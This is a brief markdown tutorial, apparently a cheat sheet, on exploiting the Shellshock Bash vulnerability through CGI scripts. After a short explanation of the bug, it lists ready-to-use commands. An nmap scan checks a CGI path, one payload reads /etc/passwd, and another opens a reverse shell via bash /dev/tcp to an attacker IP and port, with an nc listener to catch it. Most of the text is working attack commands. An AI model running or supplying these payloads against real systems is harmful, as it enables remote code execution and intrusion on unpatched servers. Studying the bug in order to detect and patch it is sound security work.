# Exploiting Apache Shellshock Vulnerability

Shell Shock is a vulnerability in Linux which allows users to execute commands on the target Web Server if they are using CGI scripts.
<br>
For instance, consider this malicious environment variable:

```sh
export myfunction='() { echo "This is a malicious payload"; }; echo vulnerable'
```

In this case, the attacker has defined a function within `myfunction` that echoes a harmful message. When Bash sets this variable, it not only sets the function but also executes `echo vulnerable`, indicating the system is vulnerable. This can be used for various malicious purposes, including remote code execution.

#### CHECKING IF VULNERABLE

```sh
nmap -sV 192.97.138.3 --script http-shellshock --script-args "http-shellshock.uri=/gettime.cgi"
```

#### EXPLOITING SHELLSHOCK:

```sh
() { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'
```

#### CONNECTING A REVERSE SHELL BY ABUSING SHELLSHOCK

```sh
() { :; }; echo; /bin/bash -c 'bash -i>&/dev/tcp/192.97.138.2/1234 0>&1'

nc -nvlp 1234
```
